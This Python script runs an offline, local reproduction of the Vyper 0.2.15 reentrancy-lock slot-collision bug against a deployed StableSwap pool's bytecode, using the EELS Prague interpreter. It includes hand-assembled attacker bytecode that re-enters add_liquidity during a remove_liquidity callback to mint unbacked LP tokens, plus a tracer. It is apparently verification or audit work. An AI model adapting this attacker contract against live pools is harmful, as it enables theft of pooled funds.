#!/usr/bin/env python3
"""
vminus_run.py -- concrete preflight execution of the V- witness scenario.

DEFENSIVE, LOCAL, OFFLINE. This builds an in-memory Prague pre-state and runs
ONE message call `P.remove_liquidity(200,[0,0],A)` (caller A) through the
pinned EELS Prague interpreter over the EXACT deployed bytes:

  - Proxy P  : the exact 45-byte EIP-1167 minimal proxy (sha256 8824bf98...)
               delegating to implementation 0x6326debbaa15bcfe603d831e7d75f4fc10d9b43e
  - Impl     : the exact 17,535-byte Vyper 0.2.15 StableSwap runtime (sha256 082cdf7d...)
  - Attacker A: small hand-assembled runtime (bytes + listing below)
  - Token T   : small hand-assembled honest ERC20 subset (transfer only)

No network. No live transaction. No signing. Uses only the local EELS root.

Interpreter identity is recorded by --emit-meta.

The scenario witnesses the Vyper 0.2.15 per-function nonreentrant-lock
slot-collision: remove_liquidity holds lock slot 2, its ETH callback re-enters
add_liquidity which checks the DIFFERENT lock slot 0 (unlocked), mints LP to A
against a stale cached total_supply, so afterwards balanceOf[A] > totalSupply.
"""

import argparse
import hashlib
import json
import os
import sys

# --- EELS root (host guidance item 15: pinned t8n root 827a1cad, clean) ---
EELS_ROOT = os.environ.get(
    "EELS_ROOT",
    os.path.expanduser("~/execution-specs-t8n-blanc-827a1cad-clean"),
)
sys.path.insert(0, os.path.join(EELS_ROOT, "src"))

from ethereum_types.bytes import Bytes0, Bytes32
from ethereum_types.numeric import U64, U256, Uint

import ethereum
from ethereum.crypto.hash import keccak256
from ethereum.state import Account, EMPTY_CODE_HASH
from ethereum.trace import set_evm_trace
from ethereum.forks.prague.vm import (
    BlockEnvironment,
    Message,
    TransactionEnvironment,
)
from ethereum.forks.prague.vm.interpreter import process_message_call
from ethereum.forks.prague.state_tracker import (
    BlockState,
    TransactionState,
    get_storage,
)
from ethereum.forks.prague.utils.hexadecimal import hex_to_address
from ethereum.forks.prague.vm.instructions import Ops

HERE = os.path.dirname(os.path.abspath(__file__))
PROV = os.path.normpath(os.path.join(
    HERE, "..", "vyper-provenance"))
IMPL_HEX = os.path.join(PROV, "impl-6326-runtime.hex")
if not os.path.exists(IMPL_HEX):
    IMPL_HEX = os.path.normpath(os.path.join(HERE, "..", "inputs", "vyper-6326-runtime.hex"))

PROXY_HEX = "363d3d373d3d3d363d736326debbaa15bcfe603d831e7d75f4fc10d9b43e5af43d82803e903d91602b57fd5bf3"

# addresses
P_ADDR = hex_to_address("0x9848482da3ee3076165ce6497eda906e66bb85c5")   # proxy
IMPL_ADDR = hex_to_address("0x6326debbaa15bcfe603d831e7d75f4fc10d9b43e")  # implementation
A_ADDR = hex_to_address("0xaaaa000000000000000000000000000000000a11")   # attacker / sole LP holder
T_ADDR = hex_to_address("0xbbbb000000000000000000000000000000000b0b")   # honest token (coin 1)
ORIGIN = A_ADDR

SEL_REMOVE = keccak256(b"remove_liquidity(uint256,uint256[2],address)")[:4]
SEL_ADD = keccak256(b"add_liquidity(uint256[2],uint256,address)")[:4]
SEL_TRANSFER = keccak256(b"transfer(address,uint256)")[:4]


def b32(x: int) -> Bytes32:
    return Bytes32(x.to_bytes(32, "big"))


def addr_word(a: bytes) -> bytes:
    return b"\x00" * 12 + bytes(a)


# ------------------------------------------------------------------ attacker
def build_attacker():
    """
    Attacker runtime. Entered once by P's ETH raw_call (empty calldata, value=100).
    Unconditionally calls P.add_liquidity([100,0], 0, A) forwarding all 100 wei,
    then STOPs (returns success to P). No loop: add_liquidity with amounts[1]==0
    makes no callback into A, so A executes exactly once.

    Memory layout of the outgoing calldata (132 bytes):
      [0:4]    selector add_liquidity(uint256[2],uint256,address)
      [4:36]   amounts[0] = 100
      [36:68]  amounts[1] = 0
      [68:100] min_mint   = 0
      [100:132] receiver  = A
    """
    code = bytearray()
    listing = []

    def emit(bs, note):
        listing.append((len(code), bs.hex(), note))
        code.extend(bs)

    # selector << 224 -> top 4 bytes of a word, MSTORE at 0
    emit(bytes([0x63]) + SEL_ADD, "PUSH4 add_liquidity_selector")
    emit(bytes([0x60, 0xE0]), "PUSH1 224")
    emit(bytes([0x1B]), "SHL")
    emit(bytes([0x60, 0x00]), "PUSH1 0")
    emit(bytes([0x52]), "MSTORE            ; mem[0:4]=selector")
    # amounts[0]=100 at offset 4
    emit(bytes([0x60, 0x64]), "PUSH1 100")
    emit(bytes([0x60, 0x04]), "PUSH1 4")
    emit(bytes([0x52]), "MSTORE            ; mem[4:36]=100")
    # amounts[1]=0 at offset 36
    emit(bytes([0x60, 0x00]), "PUSH1 0")
    emit(bytes([0x60, 0x24]), "PUSH1 36")
    emit(bytes([0x52]), "MSTORE            ; mem[36:68]=0")
    # min_mint=0 at offset 68
    emit(bytes([0x60, 0x00]), "PUSH1 0")
    emit(bytes([0x60, 0x44]), "PUSH1 68")
    emit(bytes([0x52]), "MSTORE            ; mem[68:100]=0")
    # receiver A at offset 100
    emit(bytes([0x73]) + bytes(A_ADDR), "PUSH20 A")
    emit(bytes([0x60, 0x64]), "PUSH1 100")
    emit(bytes([0x52]), "MSTORE            ; mem[100:132]=A")
    # CALL(gas, P, value=100, argsOff=0, argsLen=132, retOff=0, retLen=0)
    emit(bytes([0x60, 0x00]), "PUSH1 0           ; retLen")
    emit(bytes([0x60, 0x00]), "PUSH1 0           ; retOff")
    emit(bytes([0x60, 0x84]), "PUSH1 132         ; argsLen")
    emit(bytes([0x60, 0x00]), "PUSH1 0           ; argsOff")
    emit(bytes([0x60, 0x64]), "PUSH1 100         ; value")
    emit(bytes([0x73]) + bytes(P_ADDR), "PUSH20 P          ; to")
    emit(bytes([0x5A]), "GAS               ; forward all gas")
    emit(bytes([0xF1]), "CALL")
    emit(bytes([0x50]), "POP               ; drop success flag")
    emit(bytes([0x00]), "STOP              ; return success to P")
    return bytes(code), listing


def build_token_simple():
    """
    Honest ERC20 transfer, assembled without fragile stack juggling by keeping
    operands in memory scratch. balanceOf[addr] stored at slot=addr.
    """
    code = bytearray()
    listing = []

    def emit(bs, note):
        listing.append((len(code), bs.hex(), note))
        code.extend(bs)

    # from = CALLER ; store nothing, use directly per op
    # bal_from = SLOAD(CALLER)
    emit(bytes([0x33]), "CALLER")
    emit(bytes([0x54]), "SLOAD             ; bal_from")            # [bal_from]
    # value = CALLDATALOAD(36)
    emit(bytes([0x60, 0x24]), "PUSH1 36")
    emit(bytes([0x35]), "CALLDATALOAD")                            # [bal_from, value]
    # new_from = bal_from - value  (SUB pops a,b -> a-b with a=top)
    #   stack top must be value then bal_from for value... SUB computes s[0]-s[1].
    #   currently s[0]=value, s[1]=bal_from -> value-bal_from (wrong). swap.
    emit(bytes([0x90]), "SWAP1")                                   # [value, bal_from]
    emit(bytes([0x03]), "SUB")                                     # [bal_from-value]
    # SSTORE(CALLER, new_from)
    emit(bytes([0x33]), "CALLER")                                  # [new_from, CALLER]
    emit(bytes([0x55]), "SSTORE            ; balanceOf[P]-=value")  # []
    # to = CALLDATALOAD(4)
    emit(bytes([0x60, 0x04]), "PUSH1 4")
    emit(bytes([0x35]), "CALLDATALOAD")                            # [to]
    # bal_to = SLOAD(to)
    emit(bytes([0x80]), "DUP1")                                    # [to, to]
    emit(bytes([0x54]), "SLOAD")                                   # [to, bal_to]
    # value = CALLDATALOAD(36)
    emit(bytes([0x60, 0x24]), "PUSH1 36")
    emit(bytes([0x35]), "CALLDATALOAD")                            # [to, bal_to, value]
    emit(bytes([0x01]), "ADD")                                     # [to, bal_to+value]
    # SSTORE(to, new_to): need [new_to, to]
    emit(bytes([0x90]), "SWAP1")                                   # [bal_to+value, to]
    emit(bytes([0x55]), "SSTORE            ; balanceOf[A]+=value")  # []
    # return 32-byte true
    emit(bytes([0x60, 0x01]), "PUSH1 1")
    emit(bytes([0x60, 0x00]), "PUSH1 0")
    emit(bytes([0x52]), "MSTORE")
    emit(bytes([0x60, 0x20]), "PUSH1 32")
    emit(bytes([0x60, 0x00]), "PUSH1 0")
    emit(bytes([0xF3]), "RETURN            ; true")
    return bytes(code), listing


# ------------------------------------------------------------------ pre-state
class DictPreState:
    """Empty pre-state; every account/storage/code is supplied via BlockState."""

    def get_account_optional(self, address):
        return None

    def get_storage(self, address, key):
        return U256(0)

    def get_code(self, code_hash):
        return b""

    def account_has_storage(self, address):
        return False

    def compute_state_root(self, block_diff):
        raise NotImplementedError


def load_impl():
    raw = open(IMPL_HEX).read().strip()
    return bytes.fromhex(raw)


def build_state(storage_overrides=None, a_balance=0):
    impl_code = load_impl()
    proxy_code = bytes.fromhex(PROXY_HEX)
    attacker_code, attacker_listing = build_attacker()
    token_code, token_listing = build_token_simple()

    block_state = BlockState(pre_state=DictPreState())

    def put_account(addr, balance, code):
        ch = keccak256(code) if code else EMPTY_CODE_HASH
        block_state.account_writes[addr] = Account(
            nonce=Uint(1), balance=U256(balance), code_hash=ch
        )
        if code:
            block_state.code_writes[ch] = code

    put_account(P_ADDR, 1000, proxy_code)        # proxy holds >=1000 wei
    put_account(IMPL_ADDR, 0, impl_code)          # implementation code
    put_account(A_ADDR, a_balance, attacker_code)  # attacker initial wei
    put_account(T_ADDR, 0, token_code)            # honest token

    # ---- P pool storage (Vyper 0.2.15 slots; verified against the run) ----
    # nonreentrant locks occupy slots 0..4; state variables follow.
    ONE = 10 ** 18
    A_key = keccak256(b32(24) + b32(int.from_bytes(bytes(A_ADDR), "big")))
    p_storage = {
        b32(0): U256(0),          # lock 'lock' (add_liquidity)
        b32(2): U256(0),          # lock 'lock' (remove_liquidity)
        b32(7): U256(int.from_bytes(bytes(T_ADDR), "big")),  # coins[1] = T
        b32(8): U256(1000),       # balances[0]
        b32(9): U256(1000),       # balances[1]
        b32(10): U256(0),         # fee
        b32(12): U256(10000),     # future_A
        b32(14): U256(0),         # future_A_time (=> _A returns future_A)
        b32(15): U256(ONE),       # rate_multipliers[0]
        b32(16): U256(ONE),       # rate_multipliers[1]
        b32(26): U256(2000),      # totalSupply
        Bytes32(bytes(A_key)): U256(2000),  # balanceOf[A]
    }
    if storage_overrides:
        p_storage.update(storage_overrides)
    block_state.storage_writes[P_ADDR] = p_storage

    # ---- T token storage: balanceOf[P] = 1000 (slot = P address word) ----
    block_state.storage_writes[T_ADDR] = {
        b32(int.from_bytes(bytes(P_ADDR), "big")): U256(1000),
    }

    meta = {
        "attacker_code": attacker_code.hex(),
        "attacker_len": len(attacker_code),
        "attacker_listing": attacker_listing,
        "token_code": token_code.hex(),
        "token_len": len(token_code),
        "token_listing": token_listing,
        "balanceOf_A_key": bytes(A_key).hex(),
    }
    return block_state, meta


# --------------------------------------------------------------------- tracer
class Tracer:
    def __init__(self):
        self.frames = {}          # id(evm) -> frame dict
        self.order = []           # frame ids in first-seen order
        self.keccaks = []         # global keccak records
        self.storage = []         # global SLOAD/SSTORE records

    def frame_of(self, evm):
        fid = id(evm)
        f = self.frames.get(fid)
        if f is None:
            m = evm.message
            f = {
                "idx": len(self.order),
                "depth": int(m.depth),
                "caller": bytes(m.caller).hex(),
                "current_target": bytes(m.current_target).hex(),
                "code_address": bytes(m.code_address).hex() if m.code_address else None,
                "value": int(m.value),
                "gas_in": int(m.gas),
                "data_len": len(m.data),
                "selector": bytes(m.data[:4]).hex(),
                "parent": id(m.parent_evm) if m.parent_evm is not None else None,
                "steps": 0,
                "gas_out": None,
                "halt": None,
                "jumpdests": [],      # ordered JUMPDEST pcs entered
                "mload_jumps": [],    # (pc_of_jump, dest) helper dispatch/return
                "calls": [],          # (pc, opname, to?) spawn sites
                "pcs": [],            # full pc list (bounded)
                "prev_op": None,
            }
            self.frames[fid] = f
            self.order.append(fid)
        return f

    def __call__(self, evm, event):
        name = type(event).__name__
        if name == "OpStart":
            f = self.frame_of(evm)
            pc = int(evm.pc)
            op = evm.code[pc]
            f["steps"] += 1
            if len(f["pcs"]) < 2_000_000:
                f["pcs"].append(pc)
            st = evm.stack
            if op == 0x5B:  # JUMPDEST
                f["jumpdests"].append(pc)
            elif op == 0x56:  # JUMP
                dest = int(st[-1]) if st else None
                if f["prev_op"] == 0x51:  # MLOAD -> JUMP (Vyper helper convention)
                    f["mload_jumps"].append((pc, dest))
            elif op == 0x20:  # KECCAK256
                if len(st) >= 2:
                    off = int(st[-1]); size = int(st[-2])
                    pre = bytes(evm.memory[off:off + size]).ljust(size, b"\x00")
                    dig = keccak256(pre)
                    self.keccaks.append({
                        "frame": f["idx"], "pc": pc, "size": size,
                        "preimage": pre.hex(), "digest": bytes(dig).hex(),
                        "target": f["current_target"],
                    })
            elif op == 0x54:  # SLOAD
                if st:
                    key = int(st[-1])
                    val = int(get_storage(evm.message.tx_env.state,
                                          evm.message.current_target,
                                          b32(key)))
                    self.storage.append({"frame": f["idx"], "pc": pc, "op": "SLOAD",
                                         "addr": f["current_target"],
                                         "slot": key, "value": val})
            elif op == 0x55:  # SSTORE
                if len(st) >= 2:
                    key = int(st[-1]); val = int(st[-2])
                    self.storage.append({"frame": f["idx"], "pc": pc, "op": "SSTORE",
                                         "addr": f["current_target"],
                                         "slot": key, "value": val})
            elif op in (0xF1, 0xF2, 0xF4, 0xFA, 0xF0, 0xF5):
                try:
                    opn = Ops(op).name
                except ValueError:
                    opn = hex(op)
                f["calls"].append((pc, opn))
            f["prev_op"] = op
        elif name in ("EvmStop", "OpException"):
            f = self.frame_of(evm)
            f["gas_out"] = int(evm.gas_left)
            f["halt"] = ("exception:" + type(getattr(event, "error", None)).__name__
                         if name == "OpException" else "stop")


# --------------------------------------------------------------------- driver
def run(gas_limit, storage_overrides=None, burn_amount=200, a_balance=0):
    block_state, meta = build_state(storage_overrides, a_balance=a_balance)
    tx_state = TransactionState(parent=block_state)

    block_env = BlockEnvironment(
        chain_id=U64(1),
        state=block_state,
        block_gas_limit=Uint(gas_limit * 2),
        block_hashes=[],
        coinbase=hex_to_address("0x0000000000000000000000000000000000000000"),
        number=Uint(21_000_000),
        base_fee_per_gas=Uint(0),
        time=U256(1_700_000_000),
        prev_randao=Bytes32(b"\x00" * 32),
        excess_blob_gas=U64(0),
        parent_beacon_block_root=b"\x00" * 32,
    )
    tx_env = TransactionEnvironment(
        origin=ORIGIN,
        gas_price=Uint(0),
        gas=Uint(gas_limit),
        access_list_addresses=set(),
        access_list_storage_keys=set(),
        state=tx_state,
        blob_versioned_hashes=(),
        authorizations=(),
        index_in_block=Uint(0),
        tx_hash=None,
    )
    calldata = bytes(SEL_REMOVE) + b32(burn_amount) + b32(0) + b32(0) + addr_word(bytes(A_ADDR))
    proxy_code = bytes.fromhex(PROXY_HEX)
    msg = Message(
        block_env=block_env,
        tx_env=tx_env,
        caller=A_ADDR,
        target=P_ADDR,
        current_target=P_ADDR,
        gas=Uint(gas_limit),
        value=U256(0),
        data=calldata,
        code_address=P_ADDR,
        code=proxy_code,
        depth=Uint(0),
        should_transfer_value=True,
        is_static=False,
        accessed_addresses=set(),
        accessed_storage_keys=set(),
        disable_precompiles=False,
        parent_evm=None,
    )

    tr = Tracer()
    set_evm_trace(tr)
    out = process_message_call(msg)
    set_evm_trace(lambda e, ev: None)

    # final projections
    ONE = 10 ** 18
    A_key = Bytes32(bytes.fromhex(meta["balanceOf_A_key"]))
    final = {
        "top_error": None if out.error is None else type(out.error).__name__,
        "top_gas_left": int(out.gas_left),
        "top_return_data": bytes(out.return_data).hex(),
        "P_balances_0": int(get_storage(tx_state, P_ADDR, b32(8))),
        "P_balances_1": int(get_storage(tx_state, P_ADDR, b32(9))),
        "P_totalSupply": int(get_storage(tx_state, P_ADDR, b32(26))),
        "P_balanceOf_A": int(get_storage(tx_state, P_ADDR, A_key)),
        "P_lock0": int(get_storage(tx_state, P_ADDR, b32(0))),
        "P_lock2": int(get_storage(tx_state, P_ADDR, b32(2))),
        "T_bal_P": int(get_storage(tx_state, T_ADDR,
                                   b32(int.from_bytes(bytes(P_ADDR), "big")))),
        "T_bal_A": int(get_storage(tx_state, T_ADDR,
                                   b32(int.from_bytes(bytes(A_ADDR), "big")))),
    }
    final["balanceOf_A_gt_totalSupply"] = final["P_balanceOf_A"] > final["P_totalSupply"]
    return tr, meta, final, out


def rle_blocks(seq):
    """run-length encode a sequence of block ids into [ (id,count), ... ]."""
    out = []
    for x in seq:
        if out and out[-1][0] == x:
            out[-1][1] += 1
        else:
            out.append([x, 1])
    return out


def block_path(pcs):
    """Compress a per-op pc list into a basic-block entry path.
    A block entry = pc 0, or any pc that is not prev_pc+opsize (i.e. a jump
    landing). We approximate block starts as targets right after a
    non-sequential pc change. Then RLE consecutive identical blocks."""
    if not pcs:
        return []
    starts = [pcs[0]]
    for i in range(1, len(pcs)):
        if pcs[i] <= pcs[i - 1]:          # backward or same = new block (loop/jump)
            starts.append(pcs[i])
        elif pcs[i] - pcs[i - 1] > 33:    # forward jump beyond max push span
            starts.append(pcs[i])
    return rle_blocks(starts)


def summarize(tr, meta, final):
    frames = []
    id2idx = {fid: tr.frames[fid]["idx"] for fid in tr.order}
    for fid in tr.order:
        f = tr.frames[fid]
        gas_used = None
        if f["gas_out"] is not None:
            gas_used = f["gas_in"] - f["gas_out"]
        jd_rle = rle_blocks(f["jumpdests"])
        from collections import Counter
        jd_hist = Counter(f["jumpdests"])
        hot = sorted(((c, pc) for pc, c in jd_hist.items() if c > 1),
                     reverse=True)
        frames.append({
            "idx": f["idx"],
            "depth": f["depth"],
            "caller": f["caller"],
            "current_target": f["current_target"],
            "code_address": f["code_address"],
            "value": f["value"],
            "selector": f["selector"],
            "data_len": f["data_len"],
            "gas_in": f["gas_in"],
            "gas_out": f["gas_out"],
            "gas_used_incl_children": gas_used,
            "steps": f["steps"],
            "halt": f["halt"],
            "parent_frame": id2idx.get(f["parent"]) if f["parent"] else None,
            "call_sites": [{"pc": pc, "op": op} for pc, op in f["calls"]],
            "mload_jump_sites": [{"pc": pc, "dest": d} for pc, d in f["mload_jumps"]],
            "n_jumpdests": len(f["jumpdests"]),
            "jumpdest_rle_len": len(jd_rle),
            "hot_jumpdests_count_pc": hot[:20],
            "block_path_rle": block_path(f["pcs"]),
        })
    return {"frames": frames, "final": final,
            "keccaks": tr.keccaks, "storage": tr.storage,
            "attacker_len": meta["attacker_len"],
            "token_len": meta["token_len"],
            "balanceOf_A_key": meta["balanceOf_A_key"]}


def emit_meta():
    impl = load_impl()
    proxy = bytes.fromhex(PROXY_HEX)
    atk, atk_l = build_attacker()
    tok, tok_l = build_token_simple()
    git = None
    try:
        import subprocess
        git = subprocess.check_output(
            ["git", "-C", EELS_ROOT, "rev-parse", "HEAD"]).decode().strip()
    except Exception:
        pass
    return {
        "interpreter": "EELS (ethereum/execution-specs) fork=prague",
        "eels_root": EELS_ROOT,
        "eels_git_head": git,
        "ethereum_pkg": ethereum.__file__,
        "python": sys.version.split()[0],
        "impl_sha256": hashlib.sha256(impl).hexdigest(),
        "impl_len": len(impl),
        "proxy_sha256": hashlib.sha256(proxy).hexdigest(),
        "proxy_len": len(proxy),
        "attacker_code": atk.hex(),
        "attacker_len": atk_l and len(atk),
        "attacker_listing": atk_l,
        "token_code": tok.hex(),
        "token_len": len(tok),
        "token_listing": tok_l,
        "selectors": {
            "remove_liquidity(uint256,uint256[2],address)": bytes(SEL_REMOVE).hex(),
            "add_liquidity(uint256[2],uint256,address)": bytes(SEL_ADD).hex(),
            "transfer(address,uint256)": bytes(SEL_TRANSFER).hex(),
        },
        "addresses": {"P": bytes(P_ADDR).hex(), "impl": bytes(IMPL_ADDR).hex(),
                      "A": bytes(A_ADDR).hex(), "T": bytes(T_ADDR).hex()},
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--gas", type=int, default=30_000_000)
    ap.add_argument("--out", default=None, help="write full summary JSON here")
    ap.add_argument("--emit-meta", action="store_true")
    ap.add_argument("--variant", choices=["nonzero", "zeroburn"], default="nonzero")
    args = ap.parse_args()

    if args.emit_meta:
        print(json.dumps(emit_meta(), indent=2))
        return

    burn = 200
    a_balance = 0
    if args.variant == "zeroburn":
        # zero-burn variant (design final §): remove_liquidity(0,[0,0],A). The
        # outer ETH raw_call now forwards value 0, so the attacker must ALREADY
        # own the 100 wei it deposits. Its empty-calldata branch still deposits
        # [100,0]. balanceOf[A] initial stays 2000 (burn of 0 => no change).
        burn = 0
        a_balance = 100
    tr, meta, final, out = run(args.gas, burn_amount=burn, a_balance=a_balance)
    summ = summarize(tr, meta, final)
    print(json.dumps({"final": final,
                      "n_frames": len(summ["frames"]),
                      "frames": [{k: fr[k] for k in
                                  ("idx", "depth", "current_target", "code_address",
                                   "selector", "value", "gas_in", "gas_out",
                                   "gas_used_incl_children", "steps", "halt",
                                   "call_sites", "mload_jump_sites", "n_jumpdests")}
                                 for fr in summ["frames"]],
                      "keccaks": summ["keccaks"],
                      "n_storage_ops": len(summ["storage"])},
                     indent=2))
    if args.out:
        with open(args.out, "w") as fh:
            json.dump(summ, fh, indent=1)
        print("wrote", args.out, os.path.getsize(args.out), "bytes")


if __name__ == "__main__":
    main()
